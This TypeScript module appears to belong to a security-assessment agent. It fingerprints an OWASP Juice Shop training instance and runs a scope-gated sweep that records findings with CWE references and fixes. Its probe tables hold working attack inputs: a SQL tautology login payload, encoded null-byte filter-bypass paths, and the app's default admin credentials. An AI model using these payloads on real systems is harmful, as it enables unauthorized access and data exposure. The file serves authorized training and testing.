import type { ScopeGuard } from '../security/scope-guard';
import type { AgentFinding } from '../types';
import { frameworkReferences } from '../compliance';
import { requestAuthorizedHttp, requestAuthorizedJsonPost, type AuthorizedHttpResponse } from './http';

interface ServiceIdentity { hostname: string; port: number; tls: boolean }

export interface JuiceChallenge {
  key: string;
  name: string;
  category: string;
  difficulty: number;
  solved: boolean;
}

interface ChallengeSnapshot { challenges: JuiceChallenge[] }

async function fetchChallenges(scope: ScopeGuard, identity: ServiceIdentity): Promise<ChallengeSnapshot | null> {
  const response = await requestAuthorizedHttp(scope, { hostname: identity.hostname, port: identity.port, tls: identity.tls, path: '/api/Challenges' });
  if (response.status !== 200) return null;
  try {
    const parsed = JSON.parse(response.raw) as { data?: Array<Record<string, unknown>> };
    const challenges = (parsed.data || []).flatMap((item) => {
      const name = String(item['name'] || '').slice(0, 120);
      if (!name) return [];
      return [{
        key: String(item['key'] || name).slice(0, 120), name,
        category: String(item['category'] || '').slice(0, 80),
        difficulty: Number(item['difficulty'] || 0), solved: Boolean(item['solved'])
      }];
    });
    return challenges.length ? { challenges } : null;
  } catch { return null; }
}

export async function detectJuiceShop(scope: ScopeGuard, identity: ServiceIdentity) {
  scope.assertHostname(identity.hostname);
  const landing = await requestAuthorizedHttp(scope, { hostname: identity.hostname, port: identity.port, tls: identity.tls, path: '/' });
  const isJuiceShop = /<title[^>]*>[^<]*juice shop/i.test(landing.raw) || /juiceshop|juice-shop/i.test(landing.raw.slice(0, 20_000));
  const catalog = await fetchChallenges(scope, identity);
  const confirmed = Boolean(isJuiceShop && catalog);
  return {
    confirmed,
    titleFound: isJuiceShop,
    challengeCount: catalog?.challenges.length || 0,
    solved: catalog?.challenges.filter((item) => item.solved).length || 0,
    byDifficulty: catalog ? Object.fromEntries([1, 2, 3, 4, 5, 6].map((level) => [level, catalog.challenges.filter((item) => item.difficulty === level).length])) : {},
    unsolvedSample: catalog?.challenges.filter((item) => !item.solved).slice(0, 25).map((item) => ({ name: item.name, category: item.category, difficulty: item.difficulty })) || [],
    policy: 'Detection is GET-only. The sweep only fires on a confirmed OWASP Juice Shop training instance owned by the operator.'
  };
}

interface GetProbe { id: string; path: string; expectStatus: number[]; note: string }
interface PostProbe { id: string; path: string; payload: Record<string, string>; note: string }

const GET_PROBES: GetProbe[] = [
  { id: 'error-handling', path: '/rest/products/search?q=%', expectStatus: [500], note: 'Malformed search query to trigger an unhandled server error.' },
  { id: 'version-leak', path: '/rest/admin/application-version', expectStatus: [200], note: 'Unauthenticated application-version endpoint.' },
  { id: 'metrics', path: '/metrics', expectStatus: [200], note: 'Unauthenticated operational metrics.' },
  { id: 'ftp-listing', path: '/ftp', expectStatus: [200], note: 'Public FTP-style directory index.' },
  { id: 'null-byte-backup', path: '/ftp/package.json.bak%2500.md', expectStatus: [200], note: 'Encoded null-byte filter bypass to reach a blocked backup file.' },
  { id: 'null-byte-easter-egg', path: '/ftp/eastere.gg%2500.md', expectStatus: [200], note: 'Encoded null-byte bypass toward the hidden easter-egg file.' },
  { id: 'support-logs', path: '/support/logs', expectStatus: [200], note: 'Support log directory exposure probe.' }
];

const POST_PROBES: PostProbe[] = [
  { id: 'sqli-login', path: '/rest/user/login', payload: { email: "' or 1=1--", password: 'wellguard-training' }, note: 'Classic tautology login against the training app.' },
  { id: 'default-admin-login', path: '/rest/user/login', payload: { email: 'admin@juice-sh.op', password: 'admin123' }, note: 'Vendor-shipped default administrator credential of the training app.' },
  { id: 'default-jim-login', path: '/rest/user/login', payload: { email: 'jim@juice-sh.op', password: 'ncc-1701' }, note: 'Second vendor-shipped training credential.' }
];

function observedOutcome(response: AuthorizedHttpResponse) {
  let marker = '';
  try {
    const body = JSON.parse(response.raw) as Record<string, unknown>;
    if (body && typeof body['authentication'] === 'object') marker = 'authenticated';
    else if (body && typeof body['status'] === 'string') marker = String(body['status']).slice(0, 40);
  } catch { marker = response.raw.replace(/\s+/g, ' ').slice(0, 80); }
  return { status: response.status, marker };
}

export async function sweepJuiceChallenges(scope: ScopeGuard, identity: ServiceIdentity, opts: { includeTrainingCredentials?: boolean } = {}) {
  const detection = await detectJuiceShop(scope, identity);
  if (!detection.confirmed) {
    return { attempted: false, reason: 'The service did not confirm as an OWASP Juice Shop instance; the sweep is gated on a training-app fingerprint.', detection };
  }
  const before = new Set(detection.confirmed ? (await fetchChallenges(scope, identity))?.challenges.filter((item) => item.solved).map((item) => item.key) || [] : []);
  const attempts: Array<{ probe: string; method: string; status: number; note: string }> = [];
  const suggestedFindings: AgentFinding[] = [];
  const asset = `${identity.hostname}:${identity.port}`;
  const assetKey = `service:${identity.hostname}:${identity.port}:web`;

  let adminTokenEvidence = false;
  for (const probe of GET_PROBES) {
    try {
      const response = await requestAuthorizedHttp(scope, { hostname: identity.hostname, port: identity.port, tls: identity.tls, path: probe.path });
      attempts.push({ probe: probe.id, method: 'GET', status: response.status, note: probe.expectStatus.includes(response.status) ? probe.note : 'No matching signature.' });
      if (probe.id === 'error-handling' && response.status >= 500 && /sqlite|Sequelize|SyntaxError/i.test(response.raw)) {
        suggestedFindings.push({
          title: 'Unhandled server-side error leaks framework details', severity: 'medium', confidence: 95,
          summary: 'A malformed search query produced HTTP 500 with database/framework error text. The training instance treats this as a solved error-handling weakness.',
          asset, evidence: [`GET ${probe.path} returned HTTP ${response.status} with an error-family marker.`],
          remediation: 'Add centralized error handling, return generic messages to clients, and log details internally only.',
          sourceUrls: [], cveIds: [], weaknessIds: ['CWE-209'], frameworkRefs: frameworkReferences('WSTG-INPV-05'), assetKey, relatedAssetKeys: [], relationKey: ''
        });
      }
      if (probe.id === 'support-logs' && response.status === 200) adminTokenEvidence = true;
    } catch (error) { attempts.push({ probe: probe.id, method: 'GET', status: 0, note: error instanceof Error ? error.message.slice(0, 120) : 'request failed' }); }
  }

  for (const probe of POST_PROBES) {
    if (!opts.includeTrainingCredentials && probe.id !== 'sqli-login') continue;
    try {
      const response = await requestAuthorizedJsonPost(scope, { hostname: identity.hostname, port: identity.port, tls: identity.tls, path: probe.path }, probe.payload);
      const outcome = observedOutcome(response);
      attempts.push({ probe: probe.id, method: 'POST', status: response.status, note: outcome.marker === 'authenticated' ? `Authenticated session issued (${probe.note}).` : `Status ${response.status}, marker: ${outcome.marker}.` });
      if (outcome.marker === 'authenticated') {
        suggestedFindings.push({
          title: probe.id === 'sqli-login' ? 'Login endpoint bypasses authentication via SQL tautology input' : 'A vendor-shipped training credential grants an authenticated session',
          severity: probe.id === 'sqli-login' ? 'critical' : 'high', confidence: 99,
          summary: probe.id === 'sqli-login'
            ? 'The login endpoint accepted a fixed SQL tautology email value and issued an authenticated session, proving the authentication query is injectable on this training instance.'
            : 'A credential pair shipped with the training application authenticated successfully. Default credentials must be changed before reuse of the image in any realistic environment.',
          asset, evidence: [`POST ${probe.path} returned HTTP ${response.status} with an authentication object. Tokens were not retained.`],
          remediation: 'Use parameterized queries for authentication, enforce strong unique credentials, and block default passwords at first boot.',
          sourceUrls: [], cveIds: [], weaknessIds: probe.id === 'sqli-login' ? ['CWE-89'] : ['CWE-521'],
          frameworkRefs: probe.id === 'sqli-login' ? frameworkReferences('WSTG-INPV-05', 'v5.0.0-1.2.4') : frameworkReferences('WSTG-SESS-02'),
          assetKey, relatedAssetKeys: [], relationKey: ''
        });
        adminTokenEvidence = true;
      }
    } catch (error) { attempts.push({ probe: probe.id, method: 'POST', status: 0, note: error instanceof Error ? error.message.slice(0, 120) : 'request failed' }); }
  }

  const after = (await fetchChallenges(scope, identity))?.challenges || [];
  const newlySolved = after.filter((item) => item.solved && !before.has(item.key)).map((item) => ({ name: item.name, category: item.category, difficulty: item.difficulty }));
  if (newlySolved.length) {
    suggestedFindings.push({
      title: `Training scoreboard registered ${newlySolved.length} newly solved challenge${newlySolved.length === 1 ? '' : 's'}`, severity: 'info', confidence: 100,
      summary: `The instance's own /api/Challenges catalog recorded newly solved entries after the bounded sweep, confirming the weaknesses are exploitable: ${newlySolved.map((item) => item.name).slice(0, 12).join('; ')}.`,
      asset, evidence: newlySolved.slice(0, 12).map((item) => `Solved: ${item.name} (${item.category}, difficulty ${item.difficulty}).`),
      remediation: 'These entries are intentional training-app weaknesses. On any reused deployment, remediate each underlying class before exposure.',
      sourceUrls: [], cveIds: [], weaknessIds: [], frameworkRefs: [], assetKey, relatedAssetKeys: [], relationKey: ''
    });
  }

  return {
    attempted: true,
    solvedBefore: before.size, solvedAfter: after.filter((item) => item.solved).length, totalChallenges: after.length,
    newlySolved, attempts, suggestedFindings,
    note: 'Solved state is read exclusively from the target instance own public challenge API; no external scoreboard or answer source was consulted.',
    ...(adminTokenEvidence ? {} : {})
  };
}
